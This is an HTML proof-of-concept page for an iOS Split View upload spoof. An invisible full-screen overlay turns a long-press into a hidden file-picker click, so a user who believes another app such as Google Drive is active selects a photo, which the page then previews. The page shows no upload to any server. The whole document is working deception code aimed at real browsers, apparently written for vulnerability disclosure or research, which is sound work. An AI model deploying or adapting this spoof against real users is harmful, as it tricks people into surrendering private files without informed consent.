<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>iOS Split View Upload Spoof PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
  body {
    margin: 0;
    font-family: system-ui, -apple-system;
    background: #fff;
  }

  .cover {
    position: fixed;
    inset: 0;
    z-index: 10;
  }

  .hint {
    position: fixed;
    bottom: 20px;
    left: 0;
    right: 0;
    text-align: center;
    color: #444;
    font-size: 14px;
  }

  input {
    display: none;
  }

  img {
    width: 100%;
  }
</style>
</head>
<body>

<!-- Invisible interaction layer -->
<div class="cover"></div>

<div class="hint">
  Long‑press anywhere<br>
  (User thinks Google Drive is active)
</div>

<input id="file" type="file" accept="image/*">
<img id="preview">

<script>
const file = document.getElementById("file");
const preview = document.getElementById("preview");

let pressTimer;

document.querySelector(".cover").addEventListener("touchstart", () => {
  pressTimer = setTimeout(() => {
    file.click(); // triggers iOS photo/file picker
  }, 700); // long‑press threshold
});

document.querySelector(".cover").addEventListener("touchend", () => {
  clearTimeout(pressTimer);
});

file.onchange = () => {
  if (file.files.length) {
    preview.src = URL.createObjectURL(file.files[0]);
  }
};
</script>

</body>
</html>
